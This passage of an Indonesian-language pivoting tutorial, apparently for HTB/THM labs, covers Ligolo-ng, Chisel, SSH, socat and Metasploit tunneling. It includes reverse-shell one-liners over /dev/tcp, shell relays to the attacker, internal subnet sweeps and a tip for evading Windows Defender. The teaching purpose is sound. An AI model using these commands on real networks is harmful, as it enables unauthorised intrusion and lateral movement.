### 5.3 Mengendalikan Sesi & Routing di Ligolo Console

Kembali ke jendela terminal `ligolo-proxy` di Parrot OS:

text

```
ligolo-ng » 
INFO[0045] Agent joined: user@pivot-box - 10.10.11.100:49210

# 1. Ketik 'session' untuk melihat koneksi aktif
ligolo-ng » session
? Select a session: 1 - user@pivot-box - 10.10.11.100:49210

# 2. Periksa antarmuka jaringan yang ada di sisi pivot host
[Agent : user@pivot-box] » ifconfig
Interface 1: eth0 (10.10.11.100/24)
Interface 2: eth1 (172.16.1.5/24) <── Target Subnet!

# 3. Mulai transmisi tunneling
[Agent : user@pivot-box] » start
[Agent : user@pivot-box] » INFO[0080] Starting tunnel to user@pivot-box
```

#### Langkah Krusial: Menambahkan Route Sistemik di Parrot OS

Buka tab terminal baru di Parrot OS (jangan tutup konsol Ligolo) dan tambahkan rute subnet internal ke interface TUN `ligolo`:

Bash

```
# Tambahkan routing tabel kernel
sudo ip route add 172.16.1.0/24 dev ligolo

# Verifikasi rute telah terpasang
ip route | grep ligolo
# Output: 172.16.1.0/24 dev ligolo scope link
```

_Sekarang, Anda dapat mengakses seluruh host di subnet `172.16.1.0/24` secara LANGSUNG:_

Bash

```
# Ping langsung target internal
ping -c 2 172.16.1.20

# Jalankan SYN Scan langsung tanpa proxychains!
nmap -sS -Pn -p 22,80,445 172.16.1.20

# Akses HTTP web langsung melalui browser biasa
curl http://172.16.1.20/
```

---

### 5.4 Reverse Shell Listener via Ligolo-ng

Ketika Anda berhasil mengeksploitasi target internal `172.16.1.20` dan membutuhkan reverse shell kembali ke Parrot OS:

text

```
# Di dalam konsol interaktif Ligolo-ng:
[Agent : user@pivot-box] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0120] Listener created on 0.0.0.0:4444
```

_Artinya: Port 4444 di Pivot Host akan mendengarkan koneksi masuk, dan Ligolo otomatis meneruskannya ke port 4444 di localhost Parrot OS Anda._

Bash

```
# Di terminal Parrot OS: Pasang listener Netcat lokal
nc -lvnp 4444

# Di Target Internal (172.16.1.20): Kirim reverse shell ke PIVOT IP pada port 4444
bash -i >& /dev/tcp/172.16.1.5/4444 0>&1
```

---

### 5.5 Ligolo-ng Double Pivoting (Multi-Tier Subnet)

Skenario: `Attacker (10.10.14.50)` → `Pivot 1 (172.16.1.5)` → `Pivot 2 (192.168.100.10)` → `Target Terdalam (192.168.100.50)`

Ligolo-ng (versi v0.6+) mendukung *Double Pivot* dengan mengonfigurasi `listener` di Pivot 1 yang bertindak sebagai relay ke Attacker controller:

Bash

```bash
# 1. Di Attacker (Parrot OS):
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2. Di Pivot 1 (Agent sudah terhubung ke Attacker):
# Di dalam konsol Ligolo Attacker (Session Pivot 1 aktif):
[Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# Port 11601 di Pivot 1 sekarang memforward koneksi balik ke Attacker:11601

# 3. Di Pivot 2 (Dieksekusi via Pivot 1):
./agent_linux -connect 172.16.1.5:11601 -ignore-cert &
# Agent Pivot 2 menghubungi Pivot 1:11601 yang diteruskan ke Attacker

# 4. Di Konsol Ligolo Attacker:
# Sesi baru (Pivot 2) muncul!
ligolo-ng » session
# Pilih session Pivot 2
[Agent : pivot2] » ifconfig
# Ditemukan interface subnet terdalam: 192.168.100.0/24
[Agent : pivot2] » start

# 5. Di Terminal Parrot OS (Attacker):
sudo ip route add 192.168.100.0/24 dev ligolo
# Sekarang Anda dapat mengakses subnet terdalam 192.168.100.0/24 secara langsung!
```

---

## 🔀 Bagian 6: Netcat & Socat Relay Tunneling

Terkadang Anda tidak memiliki akses root, SSH dinonaktifkan, dan sistem tidak mengizinkan kompilasi Go. Dalam situasi darurat ini, gunakan utility standar: `netcat` atau `socat`.

### 6.1 Netcat Port Redirection (Named Pipe)

Netcat standar tidak memiliki fungsi port forwarding bawaan, tetapi dapat direkayasa menggunakan Linux _Named Pipe (FIFO)_:

Bash

```
# Di Pivot Host: Buat named pipe
mkfifo /tmp/f

# Alihkan traffic port 8080 di Pivot Host menuju Port 80 di Target Internal
nc -lvnp 8080 < /tmp/f | nc 172.16.1.20 80 > /tmp/f &

# Sekarang Attacker dapat mengakses web internal via Pivot:
curl http://10.10.11.100:8080
```

---

### 6.2 Socat Port Forwarding (Robust Relay)

Socat jauh lebih stabil dibandingkan Netcat dan mendukung multi-threading (_fork_) serta enkripsi SSL.

Bash

```
# 1. Forwarding Port TCP Sederhana (Contoh: Expose Port 80 internal ke Port 8888 Pivot)
# Di Pivot Host:
socat TCP-LISTEN:8888,fork,reuseaddr TCP:172.16.1.20:80 &

# 2. Reverse Shell Relay (Meneruskan shell dari internal kembali ke Attacker)
# Di Pivot Host:
socat TCP-LISTEN:5555,fork TCP:10.10.14.50:4444 &

# Di Attacker Machine:
nc -lvnp 4444

# Di Target Internal: Arahkan reverse shell ke Pivot Host Port 5555
bash -i >& /dev/tcp/10.10.11.100/5555 0>&1
```

---

## 🎯 Bagian 7: 3 Skenario Pivoting End-to-End

### Skenario 1: Dual-NIC Host Discovery & Exploitation (HTB Style)

text

```
[Attacker: 10.10.14.50] ──► [Pivot: 10.10.11.100 | 172.16.1.5] ──► [Internal: 172.16.1.20]
```

1. **Foothold Initial:** Anda mendapatkan web shell di host `10.10.11.100`.
2. **Identifikasi Subnet Internal:**
    
    Bash
    
    ```
    # Periksa IP address seluruh interface
    ip addr show || ifconfig -a
    # Ditemukan: eth1 dengan IP 172.16.1.5/24
    
    # Periksa ARP cache untuk mendeteksi tetangga aktif
    arp -en || cat /proc/net/arp
    # Ditemukan host internal aktif: 172.16.1.20
    ```
    
3. **Eksekusi Ligolo-ng Pipeline:**
    - Attacker: `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up`
    - Attacker: `ligolo-proxy -selfcert -laddr 0.0.0.0:11601`
    - Pivot: `./agent_linux -connect 10.10.14.50:11601 -ignore-cert &`
    - Attacker Console Ligolo: `session` →→ pilih 1 →→ `start`
    - Attacker Terminal: `sudo ip route add 172.16.1.0/24 dev ligolo`
4. **Eksploitasi Target Internal:**
    
    Bash
    
    ```
    nmap -sS -p 80,445 172.16.1.20
    # Port 80 terbuka! Eksploitasi web aplikasi secara langsung via browser
    firefox http://172.16.1.20 &
    ```
    

---

### Skenario 2: Reverse Pivot Menembus Egress Firewall

Kondisi: Pivot host berada di balik restrictive corporate firewall yang memblokir semua port incoming, namun port 443 (HTTPS) diizinkan keluar.

Bash

```
# 1. Di Parrot OS (Attacker): Jalankan Chisel Server pada port 443
sudo chisel server --port 443 --reverse

# 2. Di Pivot Host: Buat reverse connection keluar ke port 443 Attacker
./chisel client 10.10.14.50:443 R:socks &

# 3. Di Parrot OS: Traffic sekarang dialihkan via SOCKS proxy localhost:1080
proxychains4 nmap -sT -Pn 172.16.1.20
```

---

### Skenario 3: Multi-Hop Double Pivot (Enterprise Segmentation)

text

```
[Attacker] ──► [Pivot 1: 10.10.11.100] ──► [Pivot 2: 172.16.1.10] ──► [Target: 192.168.100.5]
```

Metodologi Chaining via SSH Dynamic SOCKS:

1. **Lompatan 1:**
    
    Bash
    
    ```
    ssh -D 1080 user1@10.10.11.100 -N -f
    ```
    
2. **Lompatan 2 (Melalui ProxyChains):**
    
    Bash
    
    ```
    # Melakukan SSH ke Pivot 2 melalui SOCKS tunnel pertama dan membuka SOCKS kedua di port 1081
    proxychains4 ssh -D 1081 user2@172.16.1.10 -N -f
    ```
    
3. **Konfigurasi `/etc/proxychains4.conf`:**
    
    ini
    
    ```
    strict_chain
    [ProxyList]
    socks5 127.0.0.1 1080
    socks5 127.0.0.1 1081
    ```
    
4. **Akses Target Terdalam:**
    
    Bash
    
    ```
    proxychains4 curl http://192.168.100.5/
    ```
    

---

## 🛠️ Bagian 8: Integrasi Tooling Melalui Proxy

### 8.1 Host Discovery di Subnet Internal

Karena Nmap ICMP ping sering gagal melewati proxy, gunakan salah satu dari 5 metode discovery berikut langsung dari shell pivot host atau via proxy:

Bash

```bash
# Metode 1: Ping Sweep Bash Loop (Paling umum & cepat di Linux Pivot)
for i in $(seq 1 254); do
    (ping -c 1 -W 1 172.16.1.$i >/dev/null 2>&1 && echo "[+] Host ICMP Open: 172.16.1.$i") &
done; wait

# Metode 2: TCP Port Probe / Pseudo-device /dev/tcp (Jika ICMP diblokir firewall internal)
for i in $(seq 1 254); do
    (timeout 1 bash -c "echo > /dev/tcp/172.16.1.$i/22" 2>/dev/null && echo "[+] SSH Open: 172.16.1.$i") &
    (timeout 1 bash -c "echo > /dev/tcp/172.16.1.$i/80" 2>/dev/null && echo "[+] HTTP Open: 172.16.1.$i") &
done; wait

# Metode 3: ARP Scan (Paling akurat & reliable untuk local subnet - Eksekusi di Pivot)
for i in $(seq 1 254); do
    arping -c 1 -W 1 172.16.1.$i 2>/dev/null | grep "bytes from" | awk '{print $4}'
done

# Metode 4: Nmap Ping Sweep (Jika Nmap terpasang di Pivot Host)
nmap -sn 172.16.1.0/24 --open

# Metode 5: Via ProxyChains dari Attacker Workstation (Setelah tunnel SOCKS aktif)
proxychains4 nmap -sT -Pn -p 22,80,445 --open 172.16.1.0/24 -T4
```

---

### 8.2 Metasploit Framework SOCKS Pivoting

Jika eksploitasi awal menggunakan meterpreter shell:

Bash

```bash
# 1. Dari dalam sesi Meterpreter (Metode Langsung):
meterpreter > run autoroute -s 172.16.1.0/24
meterpreter > background

# Alternatif dari MSF Console:
# msf6 > use post/multi/manage/autoroute
# msf6 post(multi/manage/autoroute) > set SESSION 1
# msf6 post(multi/manage/autoroute) > set SUBNET 172.16.1.0
# msf6 post(multi/manage/autoroute) > run

# 2. Jalankan SOCKS Proxy Server bawaan Metasploit:
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j

# Sekarang alihkan ProxyChains ke port 9050 untuk mengeksekusi module exploit eksternal!
```

---

### 8.3 Burp Suite Upstream SOCKS Proxy

Untuk menginspeksi web traffic aplikasi internal di Burp Suite:

1. Buka **Burp Suite** →→ **Settings** →→ **Network** →→ **Connections**.
2. Scroll ke bagian **SOCKS Proxy**.
3. Centang **Use SOCKS proxy**.
4. Isi **SOCKS host**: `127.0.0.1`, **SOCKS port**: `1080` (sesuai port SSH `-D` atau Chisel).
5. Centang **Do DNS lookups over SOCKS proxy**.
6. Arahkan browser ke Burp listener (8080), seluruh request HTTP ke target internal `http://172.16.1.20` akan berhasil dirender di Burp Repeater.

---

## 📋 Bagian 9: Command Reference & Quick Synthesis

|Skenario Kebutuhan|Solusi Tooling Terbaik|Contoh Sintaks Perintah|
|---|---|---|
|**Akses single web/DB internal**|SSH Local Forward (`-L`)|`ssh -L 8080:TARGET_IP:80 user@PIVOT -N -f`|
|**Menerima shell dari internal**|SSH Remote Forward (`-R`)|`ssh -R 4444:127.0.0.1:4444 user@PIVOT -N -f`|
|**Full TCP Scanning (SYN / OS)**|**Ligolo-ng**|`./proxy -selfcert` & `sudo ip route add SUBNET dev ligolo`|
|**Egress Port Terbatas (Hanya HTTP)**|**Chisel**|Server: `chisel server -p 80 --reverse` / Client: `chisel client ... R:socks`|
|**Eksekusi Tools CLI Arbitrer**|**ProxyChains**|`proxychains4 nmap -sT -Pn -p- TARGET_IP`|
|**Simple Port Relay Tanpa SSH**|**Socat**|`socat TCP-LISTEN:8080,fork TCP:TARGET_IP:80 &`|

---

## 🗺️ Bagian 10: Master Pivoting Decision Tree

```text
                      [ FOOTHOLD PADA PIVOT HOST DIPEROLEH ]
                                        │
                                        ▼
                      [ Apakah Anda Memiliki Kredensial SSH? ]
                                        │
             ┌──────────────────────────┴──────────────────────────┐
             ▼ YES                                                 ▼ NO
    [ Port SSH Dapat Diakses? ]                         [ Akses ROOT di ATTACKER (Parrot)? ]
             │                                                     │
       ┌─────┴─────┐                                         ┌─────┴─────┐
       ▼ YES       ▼ NO (Blocked Firewall)                   ▼ YES       ▼ NO
 [ SSH Tunneling ] └──────────────┬──────────────────► [ LIGOLO-NG ]  [ CHISEL ]
  -D 1080 (SOCKS)                 │                   (Layer 3 TUN)   (SOCKS via HTTP)
  -L (Port Forward)               │                   Full SYN Scan   ProxyChains
  -R (Reverse Shell)              │
                                  ▼
                         [ CHISEL REVERSE ]
                      (Bypass Outbound Filtering)
```

---

## 🛠️ Bagian 11: Troubleshooting, Cleanup & OPSEC

### 11.1 Teardown & Cleanup Procedure (Tutup Tunnel Setelah Selesai)

Untuk menjaga kebersihan OPSEC dan mencegah kebocoran port/tunnel yang menggantung di mesin penyerang maupun pivot host:

Bash

```bash
# === 1. CLEANUP SSH TUNNELS ===
# Inspeksi SSH tunnel aktif
ps aux | grep -E "ssh -[LRD]"

# Matikan seluruh proses SSH tunnel
pkill -f "ssh -D"
pkill -f "ssh -L"
pkill -f "ssh -R"

# === 2. CLEANUP LIGOLO-NG ===
# Hapus static route yang ditambahkan di Attacker
sudo ip route del 172.16.1.0/24 dev ligolo 2>/dev/null || true

# Matikan dan hapus interface TUN ligolo
sudo ip link set ligolo down 2>/dev/null || true
sudo ip tuntap del ligolo mode tun 2>/dev/null || true

# === 3. CLEANUP CHISEL & SOCAT ===
pkill -f "chisel server"
pkill -f "chisel client"
pkill -f "socat TCP-LISTEN"

# === 4. VERIFIKASI MEMBERSIHKAN PORT ===
ss -tlnp | grep -E "1080|8001|9050|11601"
```

### 11.2 Common Troubleshooting & Pitfalls

|Gejala Error / Kegagalan|Akar Masalah|Tindakan Solusi Pentester|
|---|---|---|
|`bind: Address already in use`|Port lokal (misal 1080 atau 8080) sudah digunakan oleh proses lain sebelumnya.|Cari PID pemilik port: `ss -tulpn \| grep 1080` lalu hentikan via `kill -9 <PID>`.|
|ProxyChains: Seluruh koneksi mengalami `timeout`|SOCKS tunnel belum terbentuk sempurna, atau konfigurasi IP/Port di `/etc/proxychains4.conf` salah.|Verifikasi status listening: `ss -tlnp \| grep 1080`. Pastikan baris terakhir file konfigurasi sesuai (`socks5 127.0.0.1 1080`).|
|Chisel Client: `connection refused`|Chisel server belum berjalan di mesin attacker, atau port diblokir firewall AWS/VPN.|Pastikan Chisel server aktif mendengarkan (`--reverse`), dan IP listener menggunakan `0.0.0.0` bukan `127.0.0.1`.|
|Nmap: `Operation not permitted` via ProxyChains|Menjalankan scan bertipe SYN Stealth Scan (`-sS`) yang tidak didukung layer SOCKS.|**Wajib gunakan flag `-sT -Pn -n`** saat menjalankan Nmap melalui ProxyChains.|
|SSH Session terputus otomatis setelah beberapa menit|Timeout koneksi akibat ketiadaan transmisi paket saat idle.|Tambahkan opsi keepalive: `-o ServerAliveInterval=60 -o ServerAliveCountMax=3`.|
|Ligolo-ng: `interface tun not found`|Interface virtual belum dibuat di kernel host Parrot OS.|Buat interface TUN manual: `sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up`.|
|Ligolo-ng: Rute tidak merespons setelah start|Lupa menambahkan static route di tabel routing OS penyerang.|Tambahkan subnet rute: `sudo ip route add <INTERNAL_SUBNET> dev ligolo`.|
|ProxyChains mengalami DNS Leak|Domain name di-resolve oleh DNS publik lokal Anda bukan dialihkan ke tunnel.|Pastikan baris `proxy_dns` tidak diberi tanda komentar (`#`) di file `proxychains4.conf`.|
|Target Windows menolak eksekusi Chisel|Windows Defender mengenali biner Chisel publik sebagai hacktool.|Gunakan versi Chisel terkompilasi dengan enkripsi kustom, atau gunakan Ligolo-ng agent yang lebih jarang terdeteksi.|
|Browser me-load halaman web internal sangat lambat|Menggunakan `strict_chain` pada ProxyChains saat salah satu proxy mengalami degradasi jaringan.|Ubah chain mode ke `dynamic_chain` di `/etc/proxychains4.conf`.|
|Socat: `Address already in use` saat restart|Socket masih berada pada status kernel `TIME_WAIT`.|Tambahkan parameter `reuseaddr` pada opsi listening: `socat TCP-LISTEN:port,reuseaddr,fork ...`.|
|Reverse shell dari target internal tidak kembali|Target internal mencoba routing langsung ke IP VPN attacker (`10.10.14.X`).|Arahkan payload reverse shell internal ke **IP internal Pivot Host**, dan pastikan port listener sudah di-relay.|

---

## 📋 Bagian 12: Cheatsheet Copy-Paste Ready

### 1. SSH Port Forwarding

Bash

```
# Dynamic SOCKS5 Proxy di background
ssh -D 1080 $USER@$PIVOT_IP -f -N -o StrictHostKeyChecking=no

# Local Port Forwarding (Port 80 Target -> Port 8080 Attacker)
ssh -L 8080:$TARGET_IP:80 $USER@$PIVOT_IP -f -N

# Remote Port Forwarding (Listener 4444 Attacker diekspos di Pivot Port 9001)
ssh -R 9001:127.0.0.1:4444 $USER@$PIVOT_IP -f -N
```

### 2. Chisel Execution Pipeline

Bash

```
# SISI ATTACKER (Jalankan pertama kali)
chisel server --port 8001 --reverse

# SISI PIVOT HOST (Membuat Reverse SOCKS5 di Attacker Port 1080)
./chisel client $ATTACKER_IP:8001 R:socks &

# SISI PIVOT HOST (Forwarding Port Tunggal)
./chisel client $ATTACKER_IP:8001 R:9090:$TARGET_IP:80 &
```

### 3. Ligolo-ng Full Deployment

Bash

```
# SISI ATTACKER: Siapkan TUN Interface & Controller
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# SISI PIVOT HOST: Hubungkan Agent ke Attacker
./agent_linux -connect $ATTACKER_IP:11601 -ignore-cert &

# SISI ATTACKER (Setelah Agent Join & 'start' di konsol): Tambahkan Subnet Rute
sudo ip route add 172.16.1.0/24 dev ligolo
```

### 4. ProxyChains Quick Commands

Bash

```
# Scanning port TCP murni
proxychains4 nmap -sT -Pn -n -p 22,80,443,445 $TARGET_IP

# Interaksi web server internal via curl
proxychains4 curl -i http://$TARGET_IP/

# SMB Access via NetExec
proxychains4 netexec smb $TARGET_IP -u "user" -p "pass"
```

### 5. Socat Single Port Relays

Bash

```
# Forward port 8888 Pivot ke Web Target Internal
socat TCP-LISTEN:8888,fork,reuseaddr TCP:$TARGET_IP:80 &

# Relay Reverse Shell: Meneruskan koneksi port 5555 ke Attacker Port 4444
socat TCP-LISTEN:5555,fork TCP:$ATTACKER_IP:4444 &
```

---

# [⚡ Quick Start: Urutan Kerja Pivoting (Untuk Pemula)](/docs/pivoting-tunneling) — Complete Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export ATTACKER_IP="10.10.14.50"   # IP tun0 kamu (VPN HTB/THM)
export PIVOT_IP="10.10.11.100"     # IP publik pivot host yang bisa diakses
export TARGET_IP="172.16.1.20"     # IP target internal (terisolasi)
export LPORT="4444"

mkdir -p ~/pivoting/{ssh,chisel,ligolo,loot,payloads}
cd ~/pivoting

echo "[*] Attacker: $ATTACKER_IP | Pivot: $PIVOT_IP | Target: $TARGET_IP"
```

**Output yang diharapkan:**

text

```
[*] Attacker: 10.10.14.50 | Pivot: 10.10.11.100 | Target: 172.16.1.20
```

**OUTPUT GAGAL ❌ — tun0 belum ada:**

text

```
ip: command not found
```

➡️ Pastikan VPN HTB/THM aktif:

Bash

```
sudo openvpn ~/lab.ovpn &
sleep 5
ip addr show tun0
export ATTACKER_IP=$(ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "[*] ATTACKER_IP auto-detected: $ATTACKER_IP"
```

---

## ═══════════════════════════════════════

## FASE 0: DETEKSI KEBUTUHAN PIVOTING

## ═══════════════════════════════════════

> **Tujuan:** Konfirmasi apakah mesin yang sudah dikompromikan adalah pivot host (dual-NIC) dan ada jaringan internal yang perlu ditembus.

### Langkah 0.1 — Identifikasi Network Interface di Shell Target

> Masuk sini setelah dapat shell di mesin target pertama (foothold).

Bash

```
# Command 1: Lihat semua interface — cari yang punya 2+ NIC
ip addr show
ip -brief addr show   # Format lebih ringkas

# Command 2: Cek routing table — cari subnet internal
ip route
route -n

# Command 3: Cek ARP cache — siapa tetangga yang pernah berkomunikasi
arp -en
cat /proc/net/arp

# Command 4: Cek file hosts — ada hostname internal?
cat /etc/hosts

# Command 5: Cek koneksi aktif
ss -tunap
netstat -tunap 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Ditemukan dual-NIC (PIVOT HOST!):**

text

```
# ip -brief addr show
lo               UNKNOWN        127.0.0.1/8
eth0             UP             10.10.11.100/24    ← Interface publik (kamu akses dari sini)
eth1             UP             172.16.1.5/24      ← Interface internal (subnet tersembunyi!)
```

text

```
# ip route
default via 10.10.11.1 dev eth0
10.10.11.0/24 dev eth0 proto kernel scope link
172.16.1.0/24 dev eth1 proto kernel scope link    ← Subnet internal!
```

text

```
# cat /proc/net/arp
IP address       HW type     Flags       HW address          Mask     Device
172.16.1.20      0x1         0x2         00:50:56:b9:1a:2b   *        eth1
172.16.1.1       0x1         0x2         00:50:56:b9:0a:01   *        eth1
```

**Cara baca — catat semua:**

|Info|Nilai Contoh|Tindakan|
|---|---|---|
|Interface publik|eth0: 10.10.11.100|`export PIVOT_IP="10.10.11.100"`|
|Interface internal|eth1: 172.16.1.5|Catat — ini IP pivot di subnet internal|
|Subnet internal|172.16.1.0/24|`export INTERNAL_SUBNET="172.16.1.0/24"`|
|Host internal aktif|172.16.1.20|`export TARGET_IP="172.16.1.20"` (dari ARP)|

Bash

```
# Simpan semua info penting
export PIVOT_INTERNAL_IP="172.16.1.5"
export INTERNAL_SUBNET="172.16.1.0/24"
export TARGET_IP="172.16.1.20"
echo "[*] Pivot internal IP: $PIVOT_INTERNAL_IP"
echo "[*] Internal subnet: $INTERNAL_SUBNET"
echo "[*] Potential target: $TARGET_IP"
```

**OUTPUT BERHASIL ✅ — Single NIC (bukan pivot host):**

text

```
# ip -brief addr show
lo               UNKNOWN        127.0.0.1/8
eth0             UP             10.10.11.100/24    ← Hanya 1 interface
```

➡️ Mesin ini bukan pivot host, tidak ada subnet internal. Lanjutkan exploitasi di mesin ini saja. Tidak perlu pivoting.

**OUTPUT GAGAL ❌ — Shell sangat terbatas (tidak ada ip/ifconfig):**

text

```
sh: ip: command not found
sh: ifconfig: command not found
```

➡️ Coba alternatif:

Bash

```
# Alternatif di shell terbatas
cat /proc/net/fib_trie | grep "32 HOST" -B1 | grep LOCAL -A1
cat /proc/net/route
hostname -I
```

---

### Langkah 0.2 — Host Discovery di Subnet Internal

> Setelah konfirmasi ada subnet internal, cari host aktif di sana.

Bash

```
# Method 1: Ping sweep bash loop (paling umum di Linux)
for i in $(seq 1 254); do
    (ping -c 1 -W 1 172.16.1.$i >/dev/null 2>&1 && echo "[+] ICMP Live: 172.16.1.$i") &
done; wait

# Method 2: TCP probe (jika ICMP diblokir)
for i in $(seq 1 254); do
    (timeout 1 bash -c "echo > /dev/tcp/172.16.1.$i/22" 2>/dev/null && echo "[+] SSH Open: 172.16.1.$i") &
    (timeout 1 bash -c "echo > /dev/tcp/172.16.1.$i/80" 2>/dev/null && echo "[+] HTTP Open: 172.16.1.$i") &
    (timeout 1 bash -c "echo > /dev/tcp/172.16.1.$i/445" 2>/dev/null && echo "[+] SMB Open: 172.16.1.$i") &
done; wait

# Method 3: ARP scan (paling akurat untuk local subnet)
for i in $(seq 1 254); do
    arping -c 1 -W 1 172.16.1.$i 2>/dev/null | grep "bytes from" | awk '{print "[+] ARP:", $4}'
done

# Method 4: Jika nmap tersedia di pivot host
nmap -sn 172.16.1.0/24 --open 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Host ditemukan:**

text

```
[+] ICMP Live: 172.16.1.1
[+] ICMP Live: 172.16.1.20
[+] SSH Open: 172.16.1.20
[+] HTTP Open: 172.16.1.20
[+] SMB Open: 172.16.1.20
```

➡️ Catat semua host yang ditemukan:

Bash

```
# Catat host aktif
echo "172.16.1.1" >> ~/pivoting/loot/internal_hosts.txt
echo "172.16.1.20" >> ~/pivoting/loot/internal_hosts.txt
cat ~/pivoting/loot/internal_hosts.txt
```

**OUTPUT GAGAL ❌ — Tidak ada response ICMP:**

text

```
# (tidak ada output)
```

➡️ ICMP mungkin diblokir, coba TCP probe (Method 2 di atas). Jika masih tidak ada, mungkin subnet berbeda:

Bash

```
# Cek routing table lebih detail
cat /proc/net/route | awk '{printf "%s via %s dev %s\n", $1, $3, $2}' | head -20

# Coba subnet lain yang umum di enterprise
for subnet in "10.10.0" "192.168.1" "192.168.100" "172.16.0" "172.16.2"; do
    for i in 1 2 10 20 100 200; do
        (ping -c 1 -W 1 $subnet.$i >/dev/null 2>&1 && echo "[+] Live: $subnet.$i") &
    done
done; wait
```

---

### Langkah 0.3 — Pilih Metode Pivoting (Decision Point KRITIS)

text

```
KONDISI yang kamu hadapi → Pilih metode:

A. Punya credentials SSH ke pivot host (password/key)?
   Dan SSH accessible dari attacker?
   → Metode: SSH Port Forwarding (Fase 1)

B. Tidak ada SSH, tapi punya ROOT di attacker (Parrot OS)?
   Dan bisa transfer file ke pivot host?
   → Metode: Ligolo-ng (Fase 2) ← RECOMMENDED, paling powerful

C. Tidak ada SSH, hanya bisa connect outbound dari pivot?
   (HTTP/HTTPS port 80/443 allowed outbound)
   → Metode: Chisel Reverse Tunnel (Fase 3)

D. Tidak bisa install apa-apa, hanya ada nc/bash?
   → Metode: Netcat/Socat Relay (Fase 4)

E. Punya Meterpreter shell di pivot?
   → Metode: Metasploit Autoroute + SOCKS (Fase 5)
```

**Cara cek kondisi:**

Bash

```
# Cek apakah SSH tersedia
which ssh
ssh -V

# Cek apakah bisa transfer file ke pivot
# (dari attacker) python3 -m http.server 8080
# (dari pivot) curl http://ATTACKER_IP:8080/test

# Cek koneksi outbound dari pivot
curl -s http://ATTACKER_IP:8080/ --connect-timeout 3
wget -q http://ATTACKER_IP:8080/ -O /dev/null && echo "[+] Outbound HTTP OK"
```

---

## ═══════════════════════════════════════

## FASE 1: SSH PORT FORWARDING

## ═══════════════════════════════════════

> **Gunakan jika:** Punya SSH credentials ke pivot host dan SSH dapat diakses.

### Langkah 1.1 — Setup SSH Key (Opsional tapi Direkomendasikan)

Bash

```
# Jika punya id_rsa dari pivot host (misalnya dari SMB loot)
cp ~/smb_loot/keys/id_rsa ~/pivoting/ssh/pivot_id_rsa
chmod 600 ~/pivoting/ssh/pivot_id_rsa

# Test koneksi SSH ke pivot
ssh -i ~/pivoting/ssh/pivot_id_rsa -o StrictHostKeyChecking=no user@$PIVOT_IP whoami
# Atau dengan password
ssh user@$PIVOT_IP whoami
```

**OUTPUT BERHASIL ✅:**

text

```
user
```

**OUTPUT GAGAL ❌ — Port 22 tidak open:**

text

```
ssh: connect to host 10.10.11.100 port 22: Connection refused
```

➡️ SSH diblokir atau tidak berjalan. Skip ke **Fase 2 (Ligolo-ng)** atau **Fase 3 (Chisel)**.

---

### Langkah 1.2 — Dynamic SOCKS5 Proxy (Paling Fleksibel)

> Buat SOCKS5 proxy lokal yang bisa dipakai oleh ProxyChains untuk semua traffic.

Bash

```
# Command 1: Dynamic SOCKS5 di background (paling umum dipakai)
ssh -D 1080 \
    -f \
    -N \
    -q \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o ServerAliveInterval=60 \
    -o ServerAliveCountMax=3 \
    user@$PIVOT_IP

# Command 2: Dengan private key
ssh -D 1080 \
    -i ~/pivoting/ssh/pivot_id_rsa \
    -f -N -q \
    -o StrictHostKeyChecking=no \
    -o ServerAliveInterval=60 \
    user@$PIVOT_IP

# Verifikasi SOCKS port aktif
ss -tlnp | grep 1080
```

**OUTPUT BERHASIL ✅ — SOCKS port listening:**

text

```
LISTEN   0        128            127.0.0.1:1080       0.0.0.0:*    users:(("ssh",pid=14230,fd=5))
```

➡️ SOCKS proxy aktif! Lanjut ke **Langkah 1.5 — Konfigurasi ProxyChains**.

**OUTPUT GAGAL ❌ — "Bind: Address already in use":**

text

```
bind: Address already in use
```

➡️ Port 1080 sudah dipakai:

Bash

```
# Cari siapa yang pakai port 1080
ss -tulpn | grep 1080
# Kill proses lama
kill -9 $(lsof -ti:1080)
# Coba port lain
ssh -D 1081 user@$PIVOT_IP -f -N -o StrictHostKeyChecking=no
# Update proxychains.conf: socks5 127.0.0.1 1081
```

---

### Langkah 1.3 — Local Port Forwarding (Untuk Service Spesifik)

> Gunakan ini jika hanya ingin akses ke port/service tertentu di target internal.

Bash

```
# Skenario: Akses web server di 172.16.1.20:80 via localhost:8080
ssh -L 8080:$TARGET_IP:80 \
    -i ~/pivoting/ssh/pivot_id_rsa \
    -f -N -o StrictHostKeyChecking=no \
    user@$PIVOT_IP

# Test akses
curl -I http://127.0.0.1:8080

# Skenario: Akses MySQL di 172.16.1.20:3306 via localhost:3306
ssh -L 3306:$TARGET_IP:3306 \
    -i ~/pivoting/ssh/pivot_id_rsa \
    -f -N -o StrictHostKeyChecking=no \
    user@$PIVOT_IP

# Test akses MySQL
mysql -h 127.0.0.1 -P 3306 -u root -p

# Skenario: Akses SMB di 172.16.1.20:445 via localhost:4450 (445 biasanya sudah terpakai)
ssh -L 4450:$TARGET_IP:445 \
    -i ~/pivoting/ssh/pivot_id_rsa \
    -f -N -o StrictHostKeyChecking=no \
    user@$PIVOT_IP

# Test akses SMB
nxc smb 127.0.0.1 -p 4450 -u '' -p ''

# Multiple forward sekaligus
ssh -L 8080:$TARGET_IP:80 \
    -L 8443:$TARGET_IP:443 \
    -L 3306:$TARGET_IP:3306 \
    -L 4450:$TARGET_IP:445 \
    -i ~/pivoting/ssh/pivot_id_rsa \
    -f -N -o StrictHostKeyChecking=no \
